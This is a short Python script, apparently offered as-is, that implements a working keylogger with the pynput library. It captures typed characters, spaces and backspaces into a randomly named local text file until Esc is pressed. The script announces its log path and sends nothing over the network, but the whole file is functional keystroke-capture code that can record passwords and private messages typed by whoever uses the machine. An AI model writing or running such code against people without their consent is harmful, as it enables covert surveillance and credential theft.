import random
import string
import os
from pynput import keyboard

# Generate a random filename
def generate_random_filename(extension=".txt", length=8):
    letters = string.ascii_letters  # Contains both uppercase and lowercase letters
    random_filename = ''.join(random.choice(letters) for _ in range(length)) + extension
    return random_filename

# Define the log file path where keystrokes will be recorded
log_file_path = generate_random_filename()

# Open the log file in write mode
with open(log_file_path, 'w') as log_file:
    def on_press(key):
        try:
            # Only log if the key is a character
            if hasattr(key, 'char') and key.char:
                log_file.write(key.char)  # Write the character
                log_file.flush()  # Ensure it's written to disk
            elif key == keyboard.Key.space:
                log_file.write(' ')  # Write a space
                log_file.flush()  # Ensure it's written to disk
            elif key == keyboard.Key.backspace:
                # Handle backspace - remove the last character from the file
                log_file.seek(0, os.SEEK_END)  # Move to the end of the file
                # Get the current file content length
                current_length = log_file.tell()
                if current_length > 0:
                    # Move the pointer back one step and truncate
                    log_file.truncate(current_length - 1)
                    log_file.flush()  # Ensure it's written to disk
        except Exception as e:
            # Handle any exceptions if necessary
            pass

    def on_release(key):
        if key == keyboard.Key.esc:
            # Stop listener on 'Esc' key
            print("Exiting...")
            return False

    # Start the keyboard listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        print(f"Logging keystrokes to: {log_file_path}")
        listener.join()